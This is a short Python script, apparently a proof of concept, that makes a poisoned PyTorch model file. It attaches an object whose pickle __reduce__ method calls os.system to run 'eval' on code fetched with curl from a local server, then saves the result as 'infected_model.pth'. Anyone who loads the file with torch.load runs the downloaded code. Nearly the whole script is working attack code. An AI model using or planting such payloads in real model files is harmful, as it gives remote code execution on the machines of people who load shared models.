import os
import torch
from simple_model import SimpleModel
SimpleModel()

class RemoteCodeExecution:
    def __reduce__(self):
        return os.system, (f"eval \"$(curl -s http://localhost:8080)\"",)


def make_infected_model():
    # Load the original model
    malicious_model = torch.load("simple_model.pth")

    # Add the RemoteCodeExecution class to the end of the model
    malicious_model.exploit = RemoteCodeExecution()

    # Save the malicious model as a new file
    torch.save(malicious_model, "infected_model.pth")


if __name__ == "__main__":
    make_infected_model()
